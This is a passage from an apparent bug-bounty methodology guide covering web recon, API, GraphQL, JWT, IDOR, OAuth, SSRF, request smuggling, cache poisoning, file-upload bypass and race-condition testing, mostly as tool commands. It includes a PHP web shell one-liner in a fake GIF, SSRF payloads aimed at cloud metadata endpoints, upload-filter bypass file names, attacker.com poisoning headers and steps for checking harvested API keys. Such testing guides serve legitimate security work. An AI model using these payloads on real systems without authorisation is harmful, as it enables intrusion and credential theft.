# Censys for certificate data
curl -s "https://search.censys.io/api/v2/hosts/search?q=services.http.response.headers.server=nginx+AND+example.com"

# Shodan for SSL cert data
shodan search "ssl.cert.subject.cn:example.com"
```

---

## 17. Technology Fingerprinting

### NPM Package Enumeration
```bash
# Retire.js for vulnerable packages
retire --js --path https://target.com

# Manual extraction from JS files
curl -s https://target.com/static/js/main.js | grep -oP '"name":"[^"]+","version":"[^"]+"' | sort -u
```

### Framework-Specific Detection

**React**:
- React Developer Tools extension
- `__REACT_DEVTOOLS_GLOBAL_HOOK__` in console
- Webpack chunks in JS files

**Angular**:
- `ng-version` attribute in HTML
- `angular` global variable

**Vue**:
- `__VUE__` global variable
- `data-v-` attributes in CSS

### The Version-to-CVE Pipeline
1. Enumerate all technology versions
2. Cross-reference with CVE databases
3. Build custom Nuclei templates for specific CVEs
4. Test on targets before public templates exist

---

## 18. Endpoint Discovery Methodologies

### The Three Pillars of Endpoint Discovery
1. **Manual Crawling**: Click through the application
2. **Automated Crawling**: Spider with Burp, Katana, GoSpider
3. **Forced Browsing**: Brute-force with wordlists (ffuf, dirsearch)

### Manual Crawling Protocol
1. Turn off passive scanning in Burp
2. Set forms auto-submit
3. Set scope to advanced control with target name string (not FQDN)
4. Walk and browse, then spider all hosts recursively
5. Profit (more targets)

### Automated Crawling
```bash
# Katana (ProjectDiscovery)
cat https-subs.txt | katana -d 5 -jc -timeout 15 -c 20

# GoSpider
gospider -S https-subs.txt -o output -c 10 -d 3 -t 20

# Hakrawler
cat https-subs.txt | hakrawler -subs -u -d 3
```

### Forced Browsing (Directory Brute-Forcing)
```bash
# ffuf directory discovery
ffuf -w /path/to/wordlist -u https://target/FUZZ

# ffuf with extensions
ffuf -w /path/to/wordlist -u https://target/FUZZ -e .php,.bak,.old,.zip,.tar.gz

# Virtual host discovery
ffuf -c -w /path/to/wordlist -u http://target -H "Host: FUZZ.target.com" -fs <length>

# GET parameter fuzzing
ffuf -w /path/to/paramnames.txt -u https://target/script.php?FUZZ=test_value -fs 4242

# POST data fuzzing
ffuf -w /path/to/postdata.txt -X POST -d "username=admin&password=FUZZ" -u https://target/login.php -fc 401
```

### Backup File Discovery
When you find a core file (e.g., `settings.php`), test variations:
```
settings.php.bak
settings.bak
settings.php.old
settings.old
settings_old.php
settings.php~
settings.php.swp
settings.php.save
```

### Common Administrative Paths
```
/admin
/control
/manage
/backend
/logs
/backup
/debug
/test
/console
/api-docs
/swagger
/redoc
```

### The robots.txt & sitemap.xml Analysis
```bash
# robots.txt often reveals hidden paths
curl -s https://target.com/robots.txt

# sitemap.xml reveals application structure
curl -s https://target.com/sitemap.xml

# sitemap index files
curl -s https://target.com/sitemap_index.xml
```

---

## 19. Hidden Parameter Discovery

### The Parameter Discovery Mindset
Hidden parameters bypass frontend validation and often reach backend logic directly.

### Discovery Techniques

**1. Reflection Analysis**:
Send a parameter and see if it appears in the response:
```bash
curl -s "https://target.com/page?FUZZ=test" | grep "test"
```

**2. Error-Based Discovery**:
Send invalid parameter types and observe errors:
```bash
curl -s "https://target.com/api/user?id[]=test" # Array where string expected
```

**3. Mass Parameter Fuzzing**:
```bash
# Arjun
arjun -u https://api.target.com/endpoint -m POST --stable

# ParamSpider
python3 paramspider.py -d target.com

# ffuf parameter fuzzing
ffuf -u https://target.com/page?FUZZ=test -w /path/to/params.txt -mc 200,301 -ac

# x8 (hidden parameter discovery)
x8 -u "https://target.com/api" -w /path/to/wordlist
```

**4. Common Hidden Parameters**:
```
debug=1
internal=true
bypass=true
godmode=1
is_admin=true
role=admin
impersonate_user_id=123
override=true
sudo=1
test=true
admin=true
is_staff=true
is_superuser=true
mode=dev
environment=development
```

**5. Parameter Pollution**:
Send duplicate parameters with different values:
```
?user_id=123&user_id=456
```

**6. Nested Parameter Discovery**:
```json
{
  "user": {
    "name": "test",
    "role": "admin"
  }
}
```

---

## 20. API Hunting Methodologies

### The API-First Mindset
APIs power ~85%+ of modern web traffic. Most $5k-$30k payouts come from APIs, not reflected XSS in contact forms. APIs expose business logic directly, often with weak authorization and hidden endpoints.

### API Discovery Workflow

**Phase 1: Passive Collection**:
```bash
# Historical URLs (shadow APIs live here)
waymore -i target.com -mode U -oU wayurls.txt
echo "target.com" | gau --threads 10 --subs | anew gauurls.txt

# JS leakage (highest ROI)
cat wayurls.txt gauurls.txt | uro | sort -u > all_urls.txt
cat all_urls.txt | xargs -I@ curl -s @ | grep -oE "(['"])/(api|rest|graphql|v[1-9]|internal|private|admin|debug|beta|mobile|app)[a-zA-Z0-9_/-]*\x01" | tr -d "'"" | anew js-endpoints.txt
```

**Phase 2: Documentation Discovery**:
```bash
# Swagger/OpenAPI discovery
ffuf -u https://api.target.com/FUZZ -w swagger-wordlist.txt -mc 200 -ac

# Common paths:
# /swagger.json, /openapi.json, /api-docs, /docs, /redoc, /rapidoc
# /api/v1/swagger, /api/swagger-ui.html
```

**Phase 3: Active Enumeration**:
```bash
# Kiterunner (API route brute-forcing)
kr scan https://api.target.com -w routes-large.kite --delay 200ms -t 20s -x 4

# ffuf with API-specific wordlist
ffuf -u https://api.target.com/FUZZ -w httparchive_apiroutes_2026.txt -mc 200,201,204,301,302,401,403 -ac

# Method variation
cat api-candidates.txt | xargs -I@ bash -c 'for m in GET POST PUT DELETE PATCH OPTIONS; do curl -s -X $m -o /dev/null -w "%{http_code} $m @\n" @; done' | grep -v "404\|405" | anew method-variations.txt
```

**Phase 4: No-Auth Testing**:
```bash
# Find endpoints that don't require authentication
cat api-candidates.txt | httpx -silent -mc 200 -fc 401,403 | anew noauth-endpoints.txt
```

### API Endpoint Classification
Classify discovered endpoints:

| Pattern | Likely Purpose | Test Focus |
|---------|---------------|------------|
| `/api/v1/public/*` | Public API | Auth bypass, excessive data |
| `/api/v1/internal/*` | Internal API | Network access, weak auth |
| `/api/v1/admin/*` | Admin API | Privilege escalation |
| `/api/v1/users/{id}` | User resource | BOLA/IDOR |
| `/api/v1/billing/*` | Payment flow | Price manipulation |
| `/api/v1/webhooks/*` | Webhook management | SSRF, callback manipulation |
| `/graphql` | GraphQL | Introspection, query depth |
| `/api/beta/*` | Beta features | Less tested, more bugs |

---

## 21. REST API Methodologies

### The REST API Attack Surface

**1. Resource Enumeration**:
```bash
# Test for sequential IDs
for i in {1..100}; do curl -s "https://api.target.com/users/$i" -H "Authorization: Bearer $TOKEN"; done

# Test for UUID patterns
# If IDs are predictable, BOLA is likely
```

**2. HTTP Method Testing**:
```bash
# Test all methods on each endpoint
curl -X GET https://api.target.com/users/123
curl -X POST https://api.target.com/users/123 -d '{}'
curl -X PUT https://api.target.com/users/123 -d '{}'
curl -X PATCH https://api.target.com/users/123 -d '{}'
curl -X DELETE https://api.target.com/users/123
```

**3. Content-Type Negotiation**:
```bash
# Test different content types
curl -H "Content-Type: application/json" -d '{"test":true}'
curl -H "Content-Type: application/xml" -d '<test>true</test>'
curl -H "Content-Type: application/x-www-form-urlencoded" -d 'test=true'
```

**4. Mass Assignment Testing**:
See Section 20 for detailed mass assignment methodology.

**5. BOLA (Broken Object Level Authorization)**:
- Swap IDs: `user/123` → `user/456`
- Test with different user tokens
- Test with no token
- Look for bulk endpoints: `/api/users` (returns all users?)

**6. Excessive Data Exposure**:
- Compare what the frontend shows vs. what the API returns
- Check for sensitive fields: `password_hash`, `ssn`, `email`, `phone`
- Check nested objects for hidden data

---

## 22. GraphQL Methodologies

### GraphQL Discovery
```bash
# Common endpoints
/graphql
/api/graphql
/gql
/query

# Introspection test
curl -X POST -H "Content-Type: application/json" -d '{"query":"{__schema{types{name}}}"}' https://target.com/graphql

# If introspection blocked, try partial introspection
# Query for specific types, fields, mutations
```

### GraphQL Attack Patterns

**1. Introspection Abuse**:
```graphql
{
  __schema {
    types {
      name
      fields {
        name
        type {
          name
        }
      }
    }
  }
}
```

**2. Query Depth Attacks**:
```graphql
{
  user {
    friends {
      friends {
        friends {
          friends {
            name
          }
        }
      }
    }
  }
}
```

**3. Query Batching**:
```json
[
  {"query": "{ user(id: 1) { name } }"},
  {"query": "{ user(id: 2) { name } }"},
  {"query": "{ user(id: 3) { name } }"}
]
```

**4. Field Suggestion Abuse**:
```graphql
{
  user {
    name
    email
    password
    ssn
    credit_card
  }
}
```

**5. Mutation Testing**:
```graphql
mutation {
  updateUser(id: "123", input: {role: "admin"}) {
    user {
      role
    }
  }
}
```

**Tools**: Clairvoyance (introspection reconstruction), graphql-path-enum

---

## 23. Authentication Analysis Methodologies

### The Authentication Mechanism Map
For each auth mechanism, map:
- **Type**: Session cookies, JWT, OAuth, SAML, API keys, mTLS
- **Storage**: Where is the token stored? (cookie, localStorage, header)
- **Transmission**: How is it sent? (header, cookie, query param)
- **Validation**: How is it validated? (signature, database lookup, HMAC)
- **Expiration**: When does it expire? Can it be refreshed?
- **Scope**: What can it access? (all endpoints or specific?)

### JWT Analysis
```bash
# Decode JWT
echo "TOKEN" | jwt_tool.py -t

# Test for 'none' algorithm
curl -H "Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4ifQ." https://api.target.com/admin

# Test for weak secrets
jwt_tool.py -t TOKEN -d /path/to/wordlist

# Test for algorithm confusion (RS256 → HS256)
# If public key is available, sign with HS256 using public key as secret
```

### Session Cookie Analysis
Check for:
- **Secure flag**: Prevents transmission over HTTP
- **httpOnly flag**: Prevents JavaScript access
- **SameSite flag**: CSRF protection (strict, lax, none)
- **Domain scope**: Is it scoped correctly?
- **Path scope**: Is it restricted to specific paths?
- **Expiration**: Session vs. persistent

### OAuth/OIDC Analysis
See Section 26 for detailed OAuth methodology.

### API Key Analysis
- **Location**: Header, query parameter, cookie?
- **Format**: Predictable? UUID? Sequential?
- **Scope**: What can it access?
- **Rotation**: Does it expire? Can it be revoked?

---

## 24. Authorization & IDOR Methodologies

### The Authorization Testing Framework

**1. Role-Based Testing**:
```
Admin Token → User Endpoint (should work)
User Token → Admin Endpoint (should fail)
Guest → Authenticated Endpoint (should fail)
```

**2. Horizontal IDOR**:
- Access resources belonging to other users at the same privilege level
- Test: `GET /api/documents/123` with User A's token, but document 123 belongs to User B

**3. Vertical IDOR**:
- Access resources requiring higher privileges
- Test: `GET /api/admin/users` with User token

**4. Context-Based IDOR**:
- Access resources in different contexts
- Test: `GET /api/organizations/123/users/456` where User A is in Org 1 but tries to access Org 2's user

### The IDOR Discovery Workflow
1. Create two accounts (User A and User B)
2. User A creates a resource (document, profile, etc.)
3. Note the resource ID
4. User B attempts to access the resource
5. If successful → IDOR confirmed
6. Test variations:
   - Replace ID in URL
   - Replace ID in POST body
   - Replace ID in headers
   - Test bulk endpoints (`/api/users` vs `/api/users/123`)

### The BOLA (Broken Object Level Authorization) Pattern
BOLA is the #1 API vulnerability. Test for:
- Direct object references: `/api/users/123`
- Indirect object references: `/api/users?id=123`
- UUID vs. sequential ID predictability
- Bulk operations: `/api/users` returning all users

---

## 25. Business Logic Mapping

### The Business Logic Decomposition
Break every business process into testable steps:

**Example: E-commerce Checkout**
```
1. Add to Cart: POST /api/cart/items {product_id, quantity}
2. View Cart: GET /api/cart
3. Apply Coupon: POST /api/cart/coupon {code}
4. Select Shipping: POST /api/cart/shipping {method_id}
5. Place Order: POST /api/orders {cart_id, payment_method}
6. Payment: POST /api/payments {order_id, token}
7. Confirmation: GET /api/orders/{id}/confirmation
```

**Test Hypotheses**:
- Can quantity be negative? (price manipulation)
- Can coupon be applied multiple times? (coupon stacking)
- Can coupon be applied after order placed? (race condition)
- Can shipping method be changed after payment? (free shipping exploit)
- Can payment token be reused? (replay attack)
- Can order confirmation be accessed without payment? (auth bypass)

### The State Transition Testing
Applications have states. Test invalid transitions:
```
Valid: Pending → Paid → Shipped → Delivered
Invalid: Pending → Shipped (skip payment)
Invalid: Delivered → Pending (refund without approval)
```

### The Pricing Logic Testing
- Negative quantities
- Zero quantities
- Extremely large quantities (integer overflow)
- Decimal quantities
- Currency manipulation
- Rounding errors (e.g., $0.005 rounds to $0.01, but what if you exploit rounding?)

### The Race Condition Testing
See Section 39 for detailed race condition methodology.

---

## 26. OAuth/OIDC Analysis

### The OAuth Flow Analysis
Map each OAuth flow:

**Authorization Code Flow**:
```
1. User clicks "Login with Google"
2. Redirect to: https://accounts.google.com/o/oauth2/auth?client_id=...&redirect_uri=...&scope=...&state=...
3. User authenticates, Google redirects back with `?code=ABC&state=...`
4. App exchanges code for token: POST /oauth/token {code, client_id, client_secret}
5. App uses access_token to fetch user info
```

**Attack Vectors**:
1. **Redirect URI Manipulation**:
   - Can you change `redirect_uri` to attacker.com?
   - Can you use open redirect on the target domain?
   - Can you use path traversal in redirect_uri? (`/callback/../../evil`)

2. **State Parameter Bypass**:
   - Is state parameter validated?
   - Can you replay state values?
   - Is state predictable?

3. **Code Interception**:
   - Can you steal the authorization code?
   - Is PKCE used? If not, code can be replayed

4. **Scope Escalation**:
   - Can you request additional scopes?
   - Can you modify scope after approval?

5. **Token Storage**:
   - Where is the token stored?
   - Can it be extracted via XSS?

### The OIDC Specific Testing
- **ID Token Validation**: Is signature verified? Is issuer correct?
- **Nonce Parameter**: Is it validated?
- **UserInfo Endpoint**: Can you access other users' info?

---

## 27. JavaScript Recon Workflows

### The JavaScript Recon Iceberg
```
Visible: DNS / Public Site
Submerged:
  ├── JavaScript Files
  ├── Internal APIs
  ├── Hidden Endpoints
  ├── Dev Routes
  ├── Secrets
  ├── Staging Servers
  └── Configs
```

### Phase 1: JavaScript File Discovery
**Active Methods**:
- Spider the live site: Katana, Hakrawler, Burp Spider
- Extract from HTML: `<script src="...">` tags

**Passive Methods**:
- Wayback Machine historical JS files
- Common Crawl (gau)
- GitHub code search for JS files

**Commands**:
```bash
# Gather all JS URLs (active + passive)
echo "target.com" | gau | grep "\.js$" | sort -u > all_js_files.txt
cat all_js_files.txt | httpx -mc 200 > live_js_files.txt

# Download all JS files
mkdir -p js_analysis
cat live_js_files.txt | xargs -I@ curl -s @ -o js_analysis/$(basename @)
```

### Phase 2: Endpoint Extraction
```bash
# LinkFinder
python linkfinder.py -i https://target.com -d -o results.html

# xnLinkFinder (faster Go version)
cat live_js_files.txt | xnLinkFinder -vv

# Manual grep for API patterns
cat *.js | grep -oE "['"]/[a-zA-Z0-9_?&=/\-\#\.]*['"]" | sort -u

# Extract API-specific endpoints
cat *.js | grep -oE "['"]/(api|rest|graphql|v[1-9]|internal|private|admin|debug|beta|mobile|app)[a-zA-Z0-9_/-]*['"]" | tr -d "'"" | anew js-endpoints.txt
```

### Phase 3: Secret Extraction
```bash
# SecretFinder
python SecretFinder.py -i https://target.com -o results.html

# TruffleHog on downloaded JS
trufflehog filesystem js_analysis/

# Manual patterns
cat *.js | grep -i "api_key\|apikey\|secret\|token\|password\|aws_access_key\|firebase\|algolia"
```

### Phase 4: Parameter Discovery
```bash
# Look for feature flags, debug params, admin params
cat *.js | grep -oE "[a-zA-Z_][a-zA-Z0-9_]*=[a-zA-Z0-9_]*" | grep -i "debug\|admin\|test\|beta\|internal\|godmode"

# Look for URL construction patterns
cat *.js | grep -oE "\?[a-zA-Z_][a-zA-Z0-9_]*=" | sort -u
```

### Phase 5: Tech Stack Identification
```bash
# Identify frameworks
cat *.js | grep -i "react\|vue\|angular\|ember\|svelte"

# Identify third-party services
cat *.js | grep -i "sentry\|intercom\|stripe\|firebase\|algolia\|segment\|mixpanel"

# Identify build tools
cat *.js | grep -i "webpack\|vite\|rollup\|parcel\|esbuild"
```

### Phase 6: Continuous Monitoring
```bash
# Hash JS files to detect changes
md5sum js_analysis/*.js > js_hashes.txt

# Periodically re-download and compare
# New code = new features = new bugs
```

---

## 28. JavaScript Deobfuscation Workflows

### Understanding the Build Pipeline
```
Source Files (login.js, api.js, core.js)
    ↓
Bundling (Webpack, Vite) → app.bundle.js
    ↓
Minification (Terser, Uglify) → Compressed, single-line
    ↓
Obfuscation (optional) → Intentionally garbled
    ↓
Source Map (optional) → main.js.map
```

### Deobfuscation Strategies

**1. Beautification**:
```bash
# js-beautify
js-beautify -f app.bundle.js -o app.pretty.js

# Online: deobfuscate.io, unminify.com
```

**2. Source Map Reconstruction**:
```bash
# Try to download source map
curl -s https://target.com/static/js/main.js.map -o main.js.map

# If found, reconstruct original source
sourcemapper map -i main.js.map -o reconstructed/

# Or use Chrome DevTools: Sources tab → Load source map
```

**3. Variable Renaming**:
After beautification, manually rename variables based on context:
```javascript
// Before beautification
var a=function(b){return b.c};

// After beautification + analysis
var getUserName=function(userObject){return userObject.name};
```

**4. String Deobfuscation**:
For obfuscated strings like `push`:
```bash
# Python one-liner
python3 -c "print('push')"  # Output: push

# Or use de4js, deobfuscator.io
```

**5. Dynamic Analysis**:
- Set breakpoints in Chrome DevTools
- Step through code execution
- Inspect variable values at runtime
- Hook functions to intercept calls

---

## 29. Source Map Analysis

### The Source Map Gold Mine
Source maps (`.js.map`) reconstruct the original source code, revealing:
- Original variable names
- Directory structure (`src/components/Login.jsx`)
- Developer comments (`// TODO: Fix vulnerability`)
- Hidden debug endpoints
- Build configuration

### Source Map Discovery
```bash
# Append .map to every JS URL
cat live_js_files.txt | while read url; do curl -s "$url.map" -o maps/$(basename $url).map; done

# Check for 200 responses
cat live_js_files.txt | while read url; do status=$(curl -s -o /dev/null -w "%{http_code}" "$url.map"); if [ "$status" = "200" ]; then echo "$url.map"; fi; done
```

### Source Map Extraction
```bash
# Use sourcemapper tool
sourcemapper map -i main.js.map -o source/

# Or use restore-source-tree
npx restore-source-tree -i main.js.map -o source/
```

### Analysis of Reconstructed Source
1. **Search for TODO/FIXME comments**: Often reveal known issues
2. **Search for debug endpoints**: `/debug`, `/console`, `/admin`
3. **Search for API keys**: Even in reconstructed source
4. **Analyze component structure**: Understand application architecture
5. **Find test files**: May contain test credentials

---

## 30. Secret Extraction Workflows

### The Secret Hunt Mindset
Secrets in client-side code indicate poor security practices and often correlate with bigger issues.

### Secret Types to Hunt

**High-Impact**:
- AWS Access Keys (`AKIA...`)
- Google Cloud API Keys
- Azure Storage Keys
- Firebase credentials
- Stripe test/live keys
- SendGrid API keys
- Twilio credentials

**Medium-Impact**:
- Algolia API keys
- Sentry DSNs
- Intercom API keys
- Segment write keys
- Mapbox tokens
- OAuth client secrets (rare but happens)

**Low-Impact but Informative**:
- Internal domain names
- Staging server URLs
- Debug endpoint paths
- Feature flag configurations

### Extraction Techniques

**1. Regex-Based**:
```bash
# AWS keys
cat *.js | grep -oE "AKIA[0-9A-Z]{16}"

# Generic API keys
cat *.js | grep -oE "[a-zA-Z0-9_-]{32,64}"

# Specific patterns
cat *.js | grep -oE "api[_-]?key['"\s]*[:=]['"\s]*[a-zA-Z0-9_-]+"
cat *.js | grep -oE "secret['"\s]*[:=]['"\s]*[a-zA-Z0-9_-]+"
cat *.js | grep -oE "token['"\s]*[:=]['"\s]*[a-zA-Z0-9_-]+"
```

**2. Entropy Analysis**:
```bash
# TruffleHog (high entropy strings)
trufflehog filesystem js_analysis/

# GitLeaks
gitleaks detect --source js_analysis/ -v
```

**3. Manual Review**:
- Search for `config`, `settings`, `env`, `constants` objects
- Look at the top of bundled files (often contains config)
- Check for `process.env` references (may leak in SSR)

### Validation
Always validate extracted secrets:
```bash
# AWS key validation
curl -s "https://sts.amazonaws.com/?Action=GetCallerIdentity&Version=2011-06-15"   -H "Authorization: AWS4-HMAC-SHA256 Credential=AKIA..."   -H "X-Amz-Date: $(date -u +%Y%m%dT%H%M%SZ)"

# Stripe key validation
curl -s https://api.stripe.com/v1/charges -u sk_live_xxx:
```

---

## 31. Browser Behavior Analysis

### The Browser as a Recon Tool
The browser reveals how the application behaves in its intended environment.

### DevTools Analysis

**1. Network Tab**:
- Filter by XHR/Fetch to see API calls
- Analyze request/response patterns
- Look for preflight requests (CORS analysis)
- Check response sizes (anomalies may indicate data leaks)

**2. Application Tab**:
- **localStorage**: Check for sensitive data, tokens, user info
- **sessionStorage**: Check for session-specific data
- **Cookies**: Analyze flags, scope, contents
- **Service Workers**: Check for cache manipulation opportunities

**3. Console Tab**:
- Look for debug messages revealing internal paths
- Check for unhandled errors revealing stack traces
- Look for React/Vue/Angular devtools availability

**4. Sources Tab**:
- Map file structure
- Set breakpoints to trace execution
- Analyze webpack chunks
- Look for source maps

### The React Developer Tools Extension
If the app uses React:
- Install React Developer Tools
- Inspect component tree
- View props and state
- Look for sensitive data in state
- Identify hidden components (rendered conditionally)

### The State/Props Analysis
Developers often store sensitive data in React/Vue state:
```javascript
// In React state (visible via DevTools)
{
  user: {
    id: 123,
    email: "admin@target.com",
    role: "admin",
    ssn: "123-45-6789"  // ← exposed in state!
  }
}
```

---

## 32. DOM Analysis Workflows

### The DOM as Attack Surface
The DOM structure reveals:
- Hidden form fields
- Disabled buttons (with associated actions)
- Template variables
- Event listeners
- Data attributes

### DOM Inspection Techniques

**1. Hidden Elements**:
```javascript
// Find hidden elements that may contain data
document.querySelectorAll('[style*="display: none"], [style*="visibility: hidden"], [hidden]')
```

**2. Data Attributes**:
```javascript
// Extract data-* attributes
document.querySelectorAll('[data-*]').forEach(el => console.log(el.dataset))
```

**3. Event Listeners**:
```javascript
// Get event listeners (Chrome DevTools only)
getEventListeners(document.querySelector('#submit-button'))
```

**4. Template Analysis**:
Look for template syntax revealing server-side rendering:
```html
<!-- Angular -->
<div ng-if="user.isAdmin">

<!-- Vue -->
<div v-if="user.role === 'admin'">

<!-- React (JSX in source) -->
{user.isAdmin && <AdminPanel />}
```

### The postMessage Analysis
```javascript
// Listen for postMessage events
window.addEventListener('message', (event) => {
  console.log('Origin:', event.origin);
  console.log('Data:', event.data);
});

// Check if origin is validated in receiver
```

**Tools**: postMessage-tracker (Chrome extension)

---

## 33. Parser Analysis Methodologies

### The Parser Differential Attack
Different parsers interpret the same input differently. This creates security gaps.

### Common Parser Differentials

**1. File Upload Parsers**:
- Frontend checks extension: `.jpg`
- Backend checks MIME type: `image/jpeg`
- Storage system checks magic bytes: `FF D8 FF`
- **Attack**: Polyglot file satisfying all three checks but containing executable code

**2. JSON/XML Parsers**:
- Frontend sends JSON
- Backend parses XML (XXE opportunity)
- Test content-type switching

**3. URL Parsers**:
- Different libraries parse URLs differently
- `http://evil.com@target.com` vs `http://target.com@evil.com`
- Unicode normalization differences

**4. HTTP Request Parsers**:
- Frontend framework parses headers one way
- Backend framework parses differently
- Request smuggling opportunities

### The File Upload Parser Testing
```bash
# Test extension bypass
filename="shell.jpg.php"
filename="shell.php.jpg"
filename="shell.php%00.jpg"
filename="shell.jpg;.php"

# Test MIME type bypass
Content-Type: image/jpeg (but file is PHP)
Content-Type: application/octet-stream

# Test magic bytes
# Add GIF89a header to PHP file
printf 'GIF89a<?php system($_GET["cmd"]); ?>' > shell.gif.php
```

---

## 34. Response Differential Analysis

### The Differential Analysis Mindset
Compare responses to identify hidden behavior:

**1. Authenticated vs. Unauthenticated**:
```bash
curl -s https://target.com/api/users > auth_response.html
curl -s https://target.com/api/users > noauth_response.html
diff auth_response.html noauth_response.html
```

**2. Different User Roles**:
```bash
curl -s -H "Authorization: Bearer $ADMIN_TOKEN" https://target.com/api/admin > admin.html
curl -s -H "Authorization: Bearer $USER_TOKEN" https://target.com/api/admin > user.html
diff admin.html user.html
```

**3. Parameter Presence vs. Absence**:
```bash
curl -s "https://target.com/api/users?debug=1" > with_debug.html
curl -s "https://target.com/api/users" > without_debug.html
diff with_debug.html without_debug.html
```

**4. Method Variation**:
```bash
curl -s -X GET https://target.com/api/users > get.html
curl -s -X POST https://target.com/api/users -d '{}' > post.html
diff get.html post.html
```

### The Response Length Filtering
When fuzzing, filter by response length to find anomalies:
```bash
# ffuf with length filtering
ffuf -w wordlist.txt -u https://target/FUZZ -mc 200 -fs 4242

# The -fs flag filters out responses of size 4242 (common error page)
```

---

## 35. SSRF Target Identification

### The SSRF Surface Map
SSRF occurs where the server makes requests based on user input.

### Common SSRF Injection Points
1. **Webhooks**: `POST /api/webhooks {url: "..."}`
2. **File Upload via URL**: `POST /api/upload {url: "..."}`
3. **PDF Generation**: `GET /api/export/pdf?url=...`
4. **Image Proxy**: `GET /api/proxy/image?url=...`
5. **OAuth Callbacks**: `redirect_uri` manipulation
6. **API Integrations**: Third-party API calls with user-controlled URLs
7. **SSO/SAML**: URL parameters in SAML flows

### Internal Target Enumeration via SSRF
```bash
# Cloud metadata endpoints
curl -s "https://target.com/api/proxy?url=http://169.254.169.254/latest/meta-data/"
curl -s "https://target.com/api/proxy?url=http://169.254.169.254/latest/user-data"

# Kubernetes
curl -s "https://target.com/api/proxy?url=http://169.254.169.254/latest/meta-data/local-hostname"
curl -s "https://target.com/api/proxy?url=http://kubernetes.default.svc.cluster.local"

# Internal services
curl -s "https://target.com/api/proxy?url=http://localhost:8080"
curl -s "https://target.com/api/proxy?url=http://127.0.0.1:22"
curl -s "https://target.com/api/proxy?url=http://internal-api.target.com"
```

### Bypass Techniques
```bash
# IP encoding
http://0177.0.0.1/       # Octal
http://2130706433/       # Decimal
http://0x7f000001/       # Hex

# DNS rebinding
http://evil.com/         # Resolves to target IP after TTL expires

# URL parsing tricks
http://target.com@127.0.0.1
http://127.0.0.1#target.com
http://127.0.0.1?target.com

# Redirect-based
# Host a redirect on attacker server pointing to internal
```

---

## 36. Request Smuggling Target Fingerprinting

### The Request Smuggling Surface
Request smuggling occurs when front-end and back-end servers disagree on request boundaries.

### Fingerprinting for Smuggling

**1. CL.TE Detection**:
```http
POST / HTTP/1.1
Host: target.com
Content-Length: 6
Transfer-Encoding: chunked

0

X
```
If the server hangs or times out, it may be vulnerable.

**2. TE.CL Detection**:
```http
POST / HTTP/1.1
Host: target.com
Content-Length: 4
Transfer-Encoding: chunked

5
X

0

```

**3. TE.TE Detection**:
```http
POST / HTTP/1.1
Host: target.com
Content-Length: 4
Transfer-Encoding: chunked
Transfer-Encoding: x

5
X

0

```

### Target Characteristics
Look for:
- Reverse proxies: Nginx, Apache, HAProxy, CloudFront, Cloudflare
- Load balancers: F5, AWS ALB, Azure Front Door
- CDNs with caching layers
- Microservice architectures with multiple hops

**Tools**: HTTP Request Smuggler (Burp extension), smuggler.py

---

## 37. Cache Poisoning Target Identification

### The Cache Poisoning Surface
Cache poisoning occurs when you can store malicious content in a shared cache.

### Target Fingerprinting

**1. Cache Header Detection**:
```bash
curl -I https://target.com | grep -i "x-cache\|cf-cache\|age\|cache-control"
```

**2. Cache Key Analysis**:
What is included in the cache key?
- URL path? (always)
- Query parameters? (sometimes)
- Host header? (sometimes)
- Cookies? (rarely)
- User-Agent? (sometimes)

**3. Cache Buster Test**:
```bash
# Add unique parameter to bypass cache
curl -s "https://target.com/page?cb=123" > cache1.html
curl -s "https://target.com/page?cb=456" > cache2.html
diff cache1.html cache2.html
```

### Poisoning Techniques

**1. Host Header Poisoning**:
```http
GET /page HTTP/1.1
Host: attacker.com
X-Forwarded-Host: attacker.com
```

**2. Parameter Cloaking**:
```http
GET /page?param=legitimate&param=malicious HTTP/1.1
```

**3. Fat GET**:
```http
GET /page?param=value HTTP/1.1
Content-Length: 10

param=evil
```

---

## 38. File Upload Analysis Methodologies

### The File Upload Attack Surface
File uploads are complex mechanisms touching multiple parsers.

### The Upload Mechanism Decomposition
```
1. Frontend Validation (JavaScript)
2. Backend Validation (MIME type, extension, magic bytes)
3. Storage (S3, local filesystem, cloud storage)
4. Processing (ImageMagick, ffmpeg, document parser)
5. Serving (CDN, direct file access, content-type headers)
```

### Testing Each Layer

**Layer 1: Frontend Bypass**:
- Disable JavaScript
- Modify frontend validation code
- Intercept and modify request after frontend passes it

**Layer 2: Backend Validation Bypass**:
```bash
# Extension variations
shell.php → shell.php.jpg
shell.php → shell.php%00.jpg
shell.php → shell.jpg.php
shell.php → shell.pHp (case variation)
shell.php → shell.php. (trailing dot)
shell.php → shell.php... (multiple dots)

# MIME type variations
Content-Type: application/x-php
Content-Type: image/jpeg
Content-Type: application/octet-stream
Content-Type: multipart/form-data

# Magic bytes
# Add GIF89a to PHP file
printf 'GIF89a<?php system($_GET["cmd"]); ?>' > shell.gif.php
```

**Layer 3: Storage Analysis**:
- Is the file stored with original extension?
- Is it stored in predictable location?
- Can you access it directly?
- Is S3 bucket public?

**Layer 4: Processing Attack**:
- ImageMagick: MVG, MSL file formats
- ffmpeg: malicious video files
- Document parsers: XXE in DOCX, PDF
- Archive extraction: zip slip

**Layer 5: Serving Analysis**:
- Content-Type header on served file
- Content-Disposition header
- X-Content-Type-Options: nosniff
- CSP headers

### The Polyglot Approach
Create files that satisfy multiple parsers:
```bash
# JPEG + PHP polyglot
# Requires careful crafting to maintain valid JPEG structure
# while containing executable PHP code
```

---

## 39. Race Condition Hunting Methodologies

### The Race Condition Mindset
Race conditions occur when the application's state changes between check and use.

### Common Race Condition Scenarios

**1. Coupon Code Reuse**:
```
Request 1: Apply coupon "DISCOUNT50"
Request 2: Apply coupon "DISCOUNT50" (simultaneous)
Result: Both requests pass validation, both apply discount
```

**2. Balance Check Bypass**:
```
Request 1: Transfer $100 (balance: $100)
Request 2: Transfer $100 (balance: $100) (simultaneous)
Result: Both pass balance check, account goes negative
```

**3. Limit Bypass**:
```
Request 1: Create resource (limit: 1)
Request 2: Create resource (limit: 1) (simultaneous)
Result: Both pass limit check, 2 resources created
```

### Testing Techniques

**1. Turbo Intruder (Burp Suite)**:
```python
# Turbo Intruder script for race condition
from turbo_intruder import *

def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                          concurrentConnections=30,
                          requestsPerConnection=100,
                          pipeline=False)

    for i in range(50):
        engine.queue(target.req, gate='race1')

    engine.openGate('race1')

def handleResponse(req, interesting):
    table.add(req)
```

**2. Custom Python Script**:
```python
import requests
import threading

url = "https://target.com/api/apply-coupon"
data = {"coupon": "DISCOUNT50"}
